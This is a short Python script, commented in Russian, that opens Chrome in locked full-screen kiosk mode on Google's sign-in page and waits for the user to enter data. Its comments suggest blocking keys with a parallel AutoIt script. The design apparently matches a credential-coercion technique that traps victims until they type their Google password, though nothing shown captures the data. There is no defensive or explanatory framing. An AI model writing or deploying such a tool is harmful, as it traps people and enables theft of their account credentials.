import os
import subprocess
import sys
import time

def launch_kiosk(browser_path, url):
    args = [
        browser_path,
        "--kiosk", url,
        "--no-first-run",
        "--disable-features=TranslateUI",
        "--disable-popup-blocking",
        "--disable-extensions"
    ]
    subprocess.Popen(args)
    # Для Windows: блокировка клавиш через AutoIt-скрипт (пример ниже)
    # AutoIt-скрипт должен быть скомпилирован и запущен параллельно
    # Можно интегрировать запуск autoit_exe здесь

if __name__ == "__main__":
    # Пример использования
    browser = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    url = "https://accounts.google.com/ServiceLogin"
    launch_kiosk(browser, url)
    print("[+] Kiosk mode launched. Waiting for user input...")
    time.sleep(60)  # Ждем, пока пользователь введет данные
    print("[+] Done.") 